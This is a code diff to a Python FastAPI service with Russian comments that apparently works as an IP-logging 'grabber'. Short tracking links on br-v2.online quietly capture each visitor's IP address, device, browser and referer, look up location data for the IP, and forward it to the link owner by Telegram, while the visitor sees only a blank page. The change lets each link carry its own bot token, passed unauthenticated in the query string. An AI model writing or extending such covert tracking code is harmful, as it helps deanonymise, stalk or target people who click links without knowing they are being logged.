@@ -18,10 +18,8 @@ from fastapi.responses import HTMLResponse
 import uvicorn
 
 # ─── Конфиг ──────────────────────────────────────────────────────────────────
-BOT_TOKEN = os.environ.get("TOKEN", "")
-# Словарь: short_id -> owner_user_id
-# Хранится в памяти — при рестарте сервера ссылки сбрасываются
-_links: dict[str, int] = {}
+# Словарь: short_id -> (owner_user_id, bot_token)
+_links: dict[str, tuple[int, str]] = {}
 
 app = FastAPI()
 
@@ -107,9 +105,9 @@ def _parse_ua(ua: str) -> tuple[str, str, str]:
 
 
 async def _notify_owner(owner_id: int, short_id: str, ip: str, ua: str,
-                         referer: str, ip_info: dict):
+                         referer: str, ip_info: dict, bot_token: str = ""):
     """Отправляет уведомление владельцу ссылки через Telegram Bot API."""
-    if not BOT_TOKEN:
+    if not bot_token:
         return
 
     device, os_name, browser = _parse_ua(ua)
@@ -139,7 +137,7 @@ async def _notify_owner(owner_id: int, short_id: str, ip: str, ua: str,
     try:
         async with aiohttp.ClientSession() as session:
             await session.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                 json={
                     "chat_id": owner_id,
                     "text": text,
@@ -154,17 +152,19 @@ async def _notify_owner(owner_id: int, short_id: str, ip: str, ua: str,
 # ─── Endpoints ────────────────────────────────────────────────────────────────
 
 @app.get("/create/{owner_id}")
-async def create_link(owner_id: int):
+async def create_link(owner_id: int, token: str = ""):
     """Внутренний endpoint — вызывается ботом для создания ссылки."""
     short_id = _generate_id()
-    _links[short_id] = owner_id
+    _links[short_id] = (owner_id, token)
     return {"short_id": short_id, "url": f"https://br-v2.online/{short_id}"}
 
 
 @app.get("/{short_id}")
 async def handle_log(short_id: str, request: Request):
     """Обрабатывает переход по ссылке."""
-    owner_id = _links.get(short_id)
+    owner_data = _links.get(short_id)
+    owner_id = owner_data[0] if owner_data else None
+    bot_token = owner_data[1] if owner_data else ""
 
     # Получаем реальный IP (учитываем прокси/CDN)
     forwarded = request.headers.get("X-Forwarded-For")
@@ -179,10 +179,8 @@ async def handle_log(short_id: str, request: Request):
     print(f"[LOGGER] Переход: /{short_id} | IP: {ip} | UA: {ua[:60]}", flush=True)
 
     if owner_id:
-        # Обогащаем IP данными асинхронно
         ip_info = await _get_ip_info(ip)
-        # Отправляем уведомление
-        asyncio.ensure_future(_notify_owner(owner_id, short_id, ip, ua, referer, ip_info))
+        asyncio.ensure_future(_notify_owner(owner_id, short_id, ip, ua, referer, ip_info, bot_token))
 
     # Возвращаем пустую страницу
     return HTMLResponse(content="", status_code=200)
